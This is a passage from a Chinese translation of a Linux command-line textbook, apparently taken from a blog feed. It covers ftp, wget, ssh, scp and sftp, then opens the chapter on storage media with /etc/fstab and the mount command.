<h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><p>作为真正的“经典”程序之一，ftp 的名字来自于它使用的协议，即<em>文件传输协议</em>。FTP 曾经是互联网上下载文件最广泛使用的方法。大多数（如果不是全部）网络浏览器都支持它，而且你经常会看到以 ftp:&#x2F;&#x2F; 协议开头的 URI。</p>
<p>在有网络浏览器之前，就有 ftp 程序。ftp 用于与<em>FTP 服务器</em>通信，这些服务器包含可以通过网络上传和下载的文件。</p>
<p>FTP（以其原始形式）不安全，因为它以<em>明文</em>发送账户名和密码。这意味着它们没有被加密，任何在网络上<em>嗅探</em>的人都可以看到它们。因此，几乎所有在互联网上进行的 FTP 都是通过<em>匿名 FTP 服务器</em>完成的。匿名服务器允许任何人使用登录名“anonymous”和无意义的密码登录。</p>
<p>在下面的示例中，我们展示了使用 ftp 程序从匿名 FTP 服务器 fileserver 的 &#x2F;pub&#x2F;cd_images&#x2F;Ubuntu-18.04 目录中下载 Ubuntu iso 镜像的典型会话。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ftp fileserver</span><br><span class="line">Connected to fileserver.localdomain.</span><br><span class="line">220 (vsFTPd 2.0.1)</span><br><span class="line">Name (fileserver:me): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> pub/cd_images/Ubuntu-18.04</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-rw-r-- 1 500 500 733079552 Apr 25 03:53 ubuntu18.04-desktop-amd64.iso</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; lcd Desktop</span><br><span class="line">Local directory now /home/me/Desktop</span><br><span class="line">ftp&gt; get ubuntu-18.04-desktop-amd64.iso</span><br><span class="line"><span class="built_in">local</span>: ubuntu-18.04-desktop-amd64.iso remote: ubuntu-18.04-desktopamd64.iso</span><br><span class="line">200 PORT <span class="built_in">command</span> successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection <span class="keyword">for</span> ubuntu-18.04-desktopamd64.iso (733079552 bytes).</span><br><span class="line">226 File send OK.</span><br><span class="line">733079552 bytes received <span class="keyword">in</span> 68.56 secs (10441.5 kB/s)</span><br><span class="line">ftp&gt; <span class="built_in">bye</span></span><br></pre></td></tr></table></figure>

<p>表 16-1 提供了此会话期间输入的命令的解释。</p>
<p><em>表 16-1: 交互式</em> <em>ftp 命令示例</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>ftp fileserver</td>
<td>调用 ftp 程序并连接到 FTP 服务器 fileserver。</td>
</tr>
<tr>
<td>anonymous</td>
<td>登录名。在登录提示后，将出现密码提示。一些服务器接受空密码；其他服务器可能需要以电子邮件地址的形式输入密码。在这种情况下，可以尝试使用类似 <span class="exturl" data-url="bWFpbHRvOiYjMTE3OyYjMTE1OyYjMTAxOyYjeDcyOyYjeDQwOyYjMTAxOyYjeDc4OyYjOTc7JiN4NmQ7JiMxMTI7JiMxMDg7JiN4NjU7JiN4MmU7JiM5OTsmIzExMTsmI3g2ZDs=">&#117;&#115;&#101;&#x72;&#x40;&#101;&#x78;&#97;&#x6d;&#112;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;<i class="fa fa-external-link-alt"></i></span> 的内容。</td>
</tr>
<tr>
<td>cd pub&#x2F;cd_images&#x2F;Ubuntu-18.04</td>
<td>更改到远程系统上包含所需文件的目录。请注意，在大多数匿名 FTP 服务器上，供公共下载的文件通常位于 pub 目录下的某个位置。</td>
</tr>
<tr>
<td>ls</td>
<td>列出远程系统上的目录。</td>
</tr>
<tr>
<td>lcd Desktop</td>
<td>更改本地系统上的目录为 <del>&#x2F;Desktop。在示例中，调用 ftp 程序时，工作目录是 ~。此命令将工作目录更改为 \</del>&#x2F;Desktop。</td>
</tr>
<tr>
<td>get ubuntu-18.04-desktop-amd64.iso</td>
<td>告诉远程系统将文件 ubuntu-18.04-desktop-amd64.iso 传输到本地系统。由于本地系统的工作目录更改为 ~&#x2F;Desktop，文件将被下载到那里。</td>
</tr>
<tr>
<td>bye</td>
<td>从远程服务器注销并结束 ftp 程序会话。也可以使用 quit 和 exit 命令。</td>
</tr>
</tbody></table>
<p>在 ftp&gt; 提示符下输入 help 将显示支持的命令列表。使用具有足够权限的 ftp 服务器，可以执行许多常规文件管理任务。虽然操作起来有些笨拙，但确实有效。</p>
<h5 id="lftp-–-一个更好的-ftp"><a href="#lftp-–-一个更好的-ftp" class="headerlink" title="lftp – 一个更好的 ftp"></a>lftp – 一个更好的 ftp</h5><p>ftp 并不是唯一的命令行 FTP 客户端。事实上，有很多。其中一个更好（也更受欢迎）的是 Alexander Lukyanov 的 lftp。它的工作方式类似于传统的 ftp 程序，但具有许多额外的便利功能，包括多协议支持（包括 HTTP）、下载失败时自动重试、后台进程、路径名的标签完成等。</p>
<h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p>另一个用于文件下载的流行命令行程序是 wget。它适用于从 Web 和 FTP 站点下载内容。可以下载单个文件、多个文件，甚至整个站点。要下载 linuxcommand.org 的首页，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ wget http://linuxcommand.org/index.php</span><br><span class="line">--11:02:51-- http://linuxcommand.org/index.php</span><br><span class="line"> =&gt; `index.php<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Resolving linuxcommand.org... 66.35.250.210</span></span><br><span class="line"><span class="string">Connecting to linuxcommand.org|66.35.250.210|:80... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: unspecified [text/html]</span></span><br><span class="line"><span class="string"> [ &lt;=&gt; ] 3,120 --.--K/s</span></span><br><span class="line"><span class="string">11:02:51 (161.75 MB/s) - `index.php&#x27;</span> saved [3120] </span><br></pre></td></tr></table></figure>

<p>程序的许多选项允许 wget 递归下载、后台下载（允许你注销但继续下载），以及完成部分下载文件的下载。这些功能在其超出平均水平的手册页中有很好的文档记录。</p>
<h3 id="与远程主机的安全通信"><a href="#与远程主机的安全通信" class="headerlink" title="与远程主机的安全通信"></a>与远程主机的安全通信</h3><p>多年来，类 Unix 操作系统一直有能力通过网络远程管理。在普遍采用互联网之前的早期，有几个流行的程序用于远程登录到远程主机。这些程序是 rlogin 和 telnet。然而，这些程序有一个与 ftp 程序相同的致命缺陷；它们以明文传输所有通信（包括登录名和密码）。这使它们在互联网时代完全不适用。</p>
<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>为了解决这个问题，开发了一种名为安全壳（SSH）的新协议。SSH 解决了与远程主机进行安全通信的两个基本问题。</p>
<ol>
<li>它验证远程主机是否是它所声称的（从而防止所谓的中间人攻击）。</li>
<li>它加密本地和远程主机之间的所有通信。</li>
</ol>
<p>SSH 由两部分组成。SSH 服务器在远程主机上运行，监听传入连接，默认情况下在端口 22 上，而 SSH 客户端用于本地系统与远程服务器通信。</p>
<p>大多数 Linux 发行版提供了来自 OpenBSD 项目的 SSH 实现，称为 OpenSSH。一些发行版（例如，Red Hat）默认包括客户端和服务器包，而其他一些（如 Ubuntu）只提供客户端。要启用系统接收远程连接，必须在系统上安装、配置并运行 OpenSSH-server 包，并且（如果系统正在运行或位于防火墙后面）必须允许在 TCP 端口 22 上的传入网络连接。</p>
<p><strong>提示</strong>：如果您没有远</p>
<p>的远程系统连接，但想尝试这些示例，请确保您的系统上安装了 OpenSSH-server 包，并使用 localhost 作为远程主机的名称。这样，您的机器将与自己建立网络连接。</p>
<p>要连接到名为 remote-sys 的远程主机，我们会使用 ssh 客户端程序，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ssh remote-sys</span><br><span class="line">The authenticity of host <span class="string">&#x27;remote-sys (192.168.1.4)&#x27;</span> can<span class="string">&#x27;t be</span></span><br><span class="line"><span class="string">established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is</span></span><br><span class="line"><span class="string">41:ed:7a:df:23:19:bf:3c:a5:17:bc:61:b3:7f:d9:bb.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)?</span></span><br></pre></td></tr></table></figure>

<p>第一次尝试连接时，会显示一条消息，指出无法确认远程主机的真实性。这是因为客户端程序以前从未见过这个远程主机。要接受远程主机的凭证，请在提示时输入“yes”。一旦连接建立，用户将被提示输入密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added <span class="string">&#x27;remote-sys,192.168.1.4&#x27;</span> (RSA) to the list</span><br><span class="line">of known hosts.</span><br><span class="line">me@remote-sys<span class="string">&#x27;s password:</span></span><br></pre></td></tr></table></figure>

<p>成功输入密码后，我们将收到远程系统的 shell 提示符。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Last login: Sat Aug 30 13:00:48 2016</span><br><span class="line">[me@remote-sys ~]$ </span><br></pre></td></tr></table></figure>

<p>远程 shell 会话将持续进行，直到用户在远程 shell 提示符下输入 exit 命令，从而关闭远程连接。此时，本地 shell 会话恢复，本地 shell 提示符重新出现。</p>
<p>也可以使用不同的用户名连接到远程系统。例如，如果本地用户“me”在远程系统上有一个名为“bob”的账户，用户 me 可以按如下方式登录到远程系统的 bob 账户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ssh bob@remote-sys</span><br><span class="line">bob@remote-sys<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Last login: Sat Aug 30 13:03:21 2016</span></span><br><span class="line"><span class="string">[bob@remote-sys ~]$</span></span><br></pre></td></tr></table></figure>

<p>如前所述，ssh 会验证远程主机的真实性。如果远程主机未成功验证，将出现以下消息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ssh remote-sys</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="line">Someone could be eavesdropping on you right now (man-in-the-middle</span><br><span class="line">attack)!</span><br><span class="line">It is also possible that the RSA host key has just been changed.</span><br><span class="line">The fingerprint <span class="keyword">for</span> the RSA key sent by the remote host is</span><br><span class="line">41:ed:7a:<span class="built_in">df</span>:23:19:bf:3c:a5:17:bc:61:b3:7f:d9:bb. </span><br><span class="line">Please contact your system administrator.</span><br><span class="line">Add correct host key <span class="keyword">in</span> /home/me/.ssh/known_hosts to get rid of this</span><br><span class="line">message.</span><br><span class="line">Offending key <span class="keyword">in</span> /home/me/.ssh/known_hosts:1</span><br><span class="line">RSA host key <span class="keyword">for</span> remote-sys has changed and you have requested strict</span><br><span class="line">checking.</span><br><span class="line">Host key verification failed.</span><br></pre></td></tr></table></figure>

<p>这条消息是由两种可能情况之一引起的。首先，攻击者可能正在尝试中间人攻击。这很罕见，因为每个人都知道 ssh 会提醒用户这一点。更可能的罪魁祸首是远程系统已经以某种方式改变了；例如，其操作系统或 SSH 服务器已被重新安装。出于安全和安全的考虑，不应轻易忽视第一种可能性。当出现这条消息时，始终要检查远程系统的管理员。</p>
<p>确定消息是由于出于安全原因引起的问题后，可以在客户端安全地纠正问题。这是通过使用文本编辑器（例如 vim）从 ~&#x2F;.ssh&#x2F;known_hosts 文件中删除过时的密钥来完成的。在上面的示例消息中，我们看到了这个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Offending key <span class="keyword">in</span> /home/me/.ssh/known_hosts:1</span><br></pre></td></tr></table></figure>

<p>这意味着 known_hosts 文件的第一行包含冒犯的密钥。从文件中删除此行，ssh 程序将能够接受来自远程系统的新认证凭据。</p>
<p>除了在远程系统上打开 shell 会话外，ssh 还允许我们在远程系统上执行单个命令。例如，要在名为 remote-sys 的远程主机上执行 free 命令，并在本地系统上显示结果，使用这个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ssh remote-sys free</span><br><span class="line">me@twin4<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string"> total used free shared buffers cached</span></span><br><span class="line"><span class="string">Mem: 775536 507184 268352 0 110068 154596</span></span><br><span class="line"><span class="string">-/+ buffers/cache: 242520 533016</span></span><br><span class="line"><span class="string">Swap: 1572856 0 1572856</span></span><br><span class="line"><span class="string">[me@linuxbox ~]$</span></span><br></pre></td></tr></table></figure>

<p>可以通过更有趣的方式使用此技术，例如以下示例中，我们在远程系统上执行 ls 并将输出重定向到本地系统上的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ssh remote-sys <span class="string">&#x27;ls *&#x27;</span> &gt; dirlist.txt</span><br><span class="line">me@twin4<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">[me@linuxbox ~]$</span></span><br></pre></td></tr></table></figure>

<p>请注意上面命令中单引号的使用。这样做是因为我们不希望在本地机器上执行路径名展开；相反，我们希望它在远程系统上执行。同样，如果我们希望输出重定向到远程机器上的文件，我们可以将重定向运算符和文件名放在单引号内。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ssh remote-sys <span class="string">&#x27;ls * &gt; dirlist.txt&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>SSH 隧道</strong></p>
<p>通过 SSH 与远程主机建立连接时，会在本地和远程系统之间创建一个<em>加密隧道</em>。通常，这个隧道用于将在本地系统上键入的命令安全地传输到远程系统，以及将结果安全地传输回来。除了这个基本功能外，SSH 协议还允许通过加密隧道发送大多数类型的网络流量，从而在本地和远程系统之间创建一种虚拟私有网络（VPN）。</p>
<p>最常见的此功能用途之一是允许传输 X Window 系统流量。在运行 X 服务器（即，显示 GUI 的机器）的系统上，可以在远程系统上启动和运行 X 客户端程序（图形应用程序），并在本地系统上显示其显示界面。这很容易做到；这里有一个示例。假设我们坐在名为 linuxbox 的 Linux 系统前，该系统正在运行 X 服务器，我们想在名为 remote-sys 的远程系统上运行 xload 程序，以在本地系统上看到该程序的图形输出。我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ssh -X remote-sys</span><br><span class="line">me@remote-sys<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Last login: Mon Sep 08 13:23:11 2016</span></span><br><span class="line"><span class="string">[me@remote-sys ~]$ xload</span></span><br></pre></td></tr></table></figure>

<p>在远程系统上执行 xload 命令后，其窗口将出现在本地系统上。在某些系统上，您可能需要使用 “-Y” 选项而不是 “-X” 选项来执行此操作。</p>
<h4 id="scp-和-sftp"><a href="#scp-和-sftp" class="headerlink" title="scp 和 sftp"></a>scp 和 sftp</h4><p>OpenSSH 包还包括两个程序，它们可以利用 SSH 加密隧道在网络上复制文件。第一个是 scp（安全复制），它的使用方式非常类似于熟悉的 cp 程序。最显著的区别是源路径或目的路径可以前面加上远程主机的名称，后面跟一个冒号。例如，如果我们想从远程系统 remote-sys 的家目录复制一个名为 document.txt 的文档到我们本地系统的当前工作目录，我们可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ scp remote-sys:document.txt .</span><br><span class="line">me@remote-sys<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">document.txt 100% 5581 5.5KB/s 00:00</span></span><br><span class="line"><span class="string">[me@linuxbox ~]$</span></span><br></pre></td></tr></table></figure>

<p>与 ssh 一样，如果所需的远程主机账户名称与本地系统不匹配，你可以在远程主机名称前加上用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ scp bob@remote-sys:document.txt .</span><br></pre></td></tr></table></figure>

<p>第二个 SSH 文件复制程序是 sftp，顾名思义，它是 ftp 程序的安全替代品。sftp 的工作方式非常类似于我们之前使用的原始 ftp 程序；然而，它不是以明文传输一切，而是使用 SSH 加密隧道。sftp 比传统 ftp 有一个重要优势，它不要求远程主机上运行 FTP 服务器，只需要 SSH 服务器。这意味着任何可以与 SSH 客户端连接的远程机器也可以用作类似 FTP 的服务器。这是一个示例会话：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sftp remote-sys</span><br><span class="line">连接到 remote-sys...</span><br><span class="line">me@remote-sys<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">sftp&gt; ls</span></span><br><span class="line"><span class="string">ubuntu-8.04-desktop-i386.iso</span></span><br><span class="line"><span class="string">sftp&gt; lcd Desktop</span></span><br><span class="line"><span class="string">sftp&gt; get ubuntu-8.04-desktop-i386.iso</span></span><br><span class="line"><span class="string">获取 /home/me/ubuntu-8.04-desktop-i386.iso 到 ubuntu-8.04-desktop-i386.iso</span></span><br><span class="line"><span class="string">/home/me/ubuntu-8.04-desktop-i386.iso 100% 699MB 7.4MB/s 01:35</span></span><br><span class="line"><span class="string">sftp&gt; bye</span></span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong> SFTP 协议受到许多 Linux 发行版中图形文件管理器的支持。使用 GNOME 或 KDE，我们可以在位置栏中输入以 sftp:&#x2F;&#x2F; 开头的 URI，并在运行 SSH 服务器的远程系统上操作文件。</p>
<p><strong>Windows 的 SSH 客户端？</strong></p>
<p>假设你坐在 Windows 机器前，但你需要登录到你的 Linux 服务器并完成一些实际工作；你该怎么做？当然是为你的 Windows 机器获取一个 SSH 客户端程序！有很多这样的程序。最受欢迎的可能是 Simon Tatham 及其团队的 PuTTY。PuTTY 程序显示一个终端窗口，并允许 Windows 用户在远程主机上打开 SSH（或 telnet）会话。该程序还提供了 scp 和 sftp 程序的类似物。</p>
<p>PuTTY 可以在 <span class="exturl" data-url="aHR0cDovL3d3dy5jaGlhcmsuZ3JlZW5lbmQub3JnLnVrL35zZ3RhdGhhbS9wdXR0eS8=">这里<i class="fa fa-external-link-alt"></i></span> 获取。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这一章中，我们调查了大多数 Linux 系统上的网络工具。由于 Linux 在服务器和网络设备中的广泛应用，可以通过安装额外的软件添加更多工具。但即使只有基本的工具集，也可以执行许多有用的网络相关任务。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><ul>
<li><p>对于网络管理的广泛（尽管有些过时）了解，Linux 文档项目提供了<em>Linux 网络管理员指南</em>：<span class="exturl" data-url="aHR0cDovL3RsZHAub3JnL0xEUC9uYWcyL2luZGV4Lmh0bWw=">点击这里<i class="fa fa-external-link-alt"></i></span></p>
</li>
<li><p>维基百科包含许多优秀的网络文章。以下是一些基础知识：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9JbnRlcm5ldF9wcm90b2NvbF9hZGRyZXNz">互联网协议地址<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Ib3N0X25hbWU=">主机名<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Vbmlmb3JtX1Jlc291cmNlX0lkZW50aWZpZXI=">统一资源标识符<i class="fa fa-external-link-alt"></i></span>。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>存储媒体</title>
    <url>/2024/04/15-storage-media/</url>
    <content><![CDATA[<h2 id="15-–-存储媒体"><a href="#15-–-存储媒体" class="headerlink" title="15 – 存储媒体"></a>15 – 存储媒体</h2><p>在前几章中，我们研究了文件级别的数据操作。在本章中，我们将考虑设备级别的数据。Linux在处理存储设备方面具有惊人的能力，无论是物理存储（如硬盘）、网络存储，还是虚拟存储设备，如 RAID（独立磁盘冗余阵列）和 LVM（逻辑卷管理器）。</p>
<p>但是，由于这不是一本关于系统管理的书，我们不会深入探讨这个主题。我们要做的是介绍一些概念和用于管理存储设备的关键命令。</p>
<span id="more"></span>

<p>为了进行本章的练习，我们将使用 USB 闪存盘和 CD-RW 光盘（对于配备有 CD-ROM 刻录机的系统）。</p>
<p>我们将查看以下命令：</p>
<ul>
<li>mount - 挂载文件系统</li>
<li>umount - 卸载文件系统</li>
<li>fsck - 检查和修复文件系统</li>
<li>fdisk - 操作磁盘分区表</li>
<li>mkfs - 创建文件系统</li>
<li>dd - 转换和复制文件</li>
<li>genisoimage (mkisofs) - 创建 ISO 9660 镜像文件</li>
<li>wodim (cdrecord) - 将数据写入光存储媒介</li>
<li>md5sum - 计算 MD5 校验和</li>
</ul>
<h3 id="挂载和卸载存储设备"><a href="#挂载和卸载存储设备" class="headerlink" title="挂载和卸载存储设备"></a>挂载和卸载存储设备</h3><p>最近的 Linux 桌面进展使得桌面用户的存储设备管理变得极为简单。大多数情况下，我们连接一个设备到我们的系统，它就“可以正常工作”。在过去的时代（比如 2004 年），这些事情必须手动完成。在非桌面系统（即服务器）上，这仍然是一个主要的手动过程，因为服务器通常有极端的存储需求和复杂的配置要求。</p>
<p>管理存储设备的第一步是将设备连接到文件系统树。这个过程，称为<em>挂载</em>，允许设备与操作系统进行交互。正如我们在第 2 章回忆的，类 Unix 操作系统（如 Linux）维护一个单一的文件系统树，设备在不同点进行连接。这与 MS-DOS 和 Windows 等其他操作系统形成对比，它们为每个设备维护单独的文件系统树（例如 C:, D:\ 等）。</p>
<p>一个名为 &#x2F;etc&#x2F;fstab 的文件（简称“文件系统表”）列出了要在启动时挂载的设备（通常是硬盘分区）。以下是来自早期 Fedora 系统的示例 &#x2F;etc&#x2F;fstab 文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LABEL=/12 / ext4 defaults 1 1</span><br><span class="line">LABEL=/home /home ext4 defaults 1 2</span><br><span class="line">LABEL=/boot /boot ext4 defaults 1 2</span><br><span class="line">tmpfs /dev/shm tmpfs defaults 0 0</span><br><span class="line">devpts /dev/pts devpts gid=5,mode=620 0 0</span><br><span class="line">sysfs /sys sysfs defaults 0 0</span><br><span class="line">proc /proc proc defaults 0 0</span><br><span class="line">LABEL=SWAP-sda3 swap swap defaults 0 0</span><br></pre></td></tr></table></figure>

<p>此示例文件中列出的大多数文件系统是虚拟的，与我们的讨论无关。对我们来说，有趣的是前三个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LABEL=/12 / ext4 defaults 1 1</span><br><span class="line">LABEL=/home /home ext4 defaults 1 2</span><br><span class="line">LABEL=/boot /boot ext4 defaults 1 2</span><br></pre></td></tr></table></figure>

<p>这些是硬盘分区。文件中的每一行由六个字段组成，如表 15-1 所述。</p>
<p><em>表 15-1:</em> <em>&#x2F;etc&#x2F;fstab 字段</em></p>
<table>
<thead>
<tr>
<th><strong>字段</strong></th>
<th><strong>内容</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Device</td>
<td>传统上，此字段包含与物理设备相关联的实际设备文件的名称，例如 &#x2F;dev&#x2F;sda1（第一检测到的硬盘的第一分区）。但在今天的计算机中，由于有许多可以热插拔的设备（如 USB 驱动器），许多现代 Linux 发行版将设备与文本标签关联。这个标签（在格式化存储媒体时添加）可以是简单的文本标签，也可以是随机生成的 UUID（通用唯一标识符）。该标签在设备连接到系统时由操作系统读取。这样，无论实际物理设备分配了哪个设备文件，它仍然可以被正确识别。</td>
</tr>
<tr>
<td>2</td>
<td>Mount point</td>
<td>设备连接到文件系统树的目录。</td>
</tr>
<tr>
<td>3</td>
<td>File system type</td>
<td>Linux 允许许多文件系统类型被挂载。大多数本地 Linux 文件系统是第四扩展文件系统（ext4），但还支持许多其他文件系统，如 FAT16 (msdos)，FAT32 (vfat)，NTFS (ntfs)，CD-ROM (iso9660) 等。</td>
</tr>
<tr>
<td>4</td>
<td>Options</td>
<td>文件系统可以以各种选项挂载。例如，可以将文件系统挂载为只读，或防止从中执行任何程序（可移动媒体的有用安全特性）。</td>
</tr>
<tr>
<td>5</td>
<td>Frequency</td>
<td>一个数字，指定文件系统要使用 dump 命令备份的频率。</td>
</tr>
<tr>
<td>6</td>
<td>Order</td>
<td>一个数字，指定文件系统应以什么顺序使用 fsck 命令检查。</td>
</tr>
</tbody></table>
<h4 id="查看已挂载文件系统列表"><a href="#查看已挂载文件系统列表" class="headerlink" title="查看已挂载文件系统列表"></a>查看已挂载文件系统列表</h4><p>mount 命令用于挂载文件系统。输入没有参数的命令将显示当前已挂载的文件系统列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ mount</span><br><span class="line">/dev/sda2 on / <span class="built_in">type</span> ext4 (rw)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw)</span><br><span class="line">sysfs on /sys <span class="built_in">type</span> sysfs (rw)</span><br><span class="line">devpts on /dev/pts <span class="built_in">type</span> devpts (rw,gid=5,mode=620)</span><br><span class="line">/dev/sda5 on /home <span class="built_in">type</span> ext4 (rw)</span><br><span class="line">/dev/sda1 on /boot <span class="built_in">type</span> ext4 (rw)</span><br><span class="line">tmpfs on /dev/shm <span class="built_in">type</span> tmpfs (rw)</span><br><span class="line">none on /proc/sys/fs/binfmt_misc <span class="built_in">type</span> binfmt_misc (rw)</span><br><span class="line">sunrpc on /var/lib/nfs/rpc_pipefs <span class="built_in">type</span> rpc_pipefs (rw)</span><br><span class="line">fusectl on /sys/fs/fuse/connections <span class="built_in">type</span> fusectl (rw)</span><br><span class="line">/dev/sdd1 on /media/disk <span class="built_in">type</span> vfat (rw,nosuid,nodev,noatime,</span><br><span class="line">uhelper=hal,uid=500,utf8,shortname=lower)</span><br><span class="line">twin4:/musicbox on /misc/musicbox <span class="built_in">type</span> nfs4 (rw,addr=192.168.1.4)</span><br></pre></td></tr></table></figure>

<p>列表的格式如下：<em>device</em> on <em>mount_point</em> type <em>file_system_type</em> (<em>options</em>)。例如，第一行显示设备 &#x2F;dev&#x2F;sda2 挂载为根文件系统，类型为 ext4，并且可读写（选项“rw”）。此列表还在底部有两个有趣的条目。倒数第二个条目显示了一个 2GB 的 SD 存储卡在读卡器中挂载在 &#x2F;media&#x2F;disk 上，最后一个条目是一个挂载在 &#x2F;misc&#x2F;musicbox 上的网络驱动器。</p>
<p>在我们的第一个实验中，我们将使用 CD-ROM。首先，让我们看看在插入 CD-ROM 之前的系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ mount</span><br><span class="line">/dev/mapper/VolGroup00-LogVol00 on / <span class="built_in">type</span> ext4 (rw)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw)</span><br><span class="line">sysfs on /sys <span class="built_in">type</span> sysfs (rw)</span><br><span class="line">devpts on /dev/pts <span class="built_in">type</span> devpts (rw,gid=5,mode=620)</span><br><span class="line">/dev/sda1 on /boot <span class="built_in">type</span> ext4 (rw)</span><br><span class="line">tmpfs on /dev/shm <span class="built_in">type</span> tmpfs (rw)</span><br><span class="line">none on /proc/sys/fs/binfmt_misc <span class="built_in">type</span> binfmt_misc (rw)</span><br><span class="line">sunrpc on /var/lib/nfs/rpc_pipefs <span class="built_in">type</span> rpc_pipefs (rw)</span><br></pre></td></tr></table></figure>

<p>这个列表来自一个使用 LVM（逻辑卷管理器）创建其根文件系统的 CentOS 系统。像许多现代 Linux 发行版一样，该系统在插入 CD-ROM 后会尝试自动挂载它。插入光盘后，我们看到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ mount</span><br><span class="line">/dev/mapper/VolGroup00-LogVol00 on / <span class="built_in">type</span> ext4 (rw)</span><br><span class="line">proc on /proc <span class="built_in">type</span> proc (rw)</span><br><span class="line">sysfs on /sys <span class="built_in">type</span> sysfs (rw)</span><br><span class="line">devpts on /dev/pts <span class="built_in">type</span> devpts (rw,gid=5,mode=620)</span><br><span class="line">/dev/hda1 on /boot <span class="built_in">type</span> ext4 (rw)</span><br><span class="line">tmpfs on /dev/shm <span class="built_in">type</span> tmpfs (rw)</span><br><span class="line">none on /proc/sys/fs/binfmt_misc <span class="built_in">type</span> binfmt_misc (rw)</span><br><span class="line">sunrpc on /var/lib/nfs/rpc_pipefs <span class="built_in">type</span> rpc_pipefs (rw)</span><br><span class="line">/dev/sdc on /media/live-1.0.10-8 <span class="built_in">type</span> iso9660 (ro,noexec,nosuid,</span><br><span class="line">nodev,uid=500)</span><br></pre></td></tr></table></figure>

<p>插入光盘后，我们看到与之前相同的列表，但增加了一个条目。列表的末尾显示 CD-ROM（在此系统上为设备 &#x2F;dev&#x2F;sdc）已挂载在 &#x2F;media&#x2F;live-1.0.10-8 上，类型为 iso9660（CDROM）。对于我们的实验来说，我们感兴趣的是设备的名称。当您自己进行这个实验时，设备名称可能会有所不同。</p>
<p><strong>警告：</strong> 在接下来的示例中，至关重要的是您要密切关注您系统中使用的实际设备名称，并且<strong>不要使用文中的名称！</strong></p>
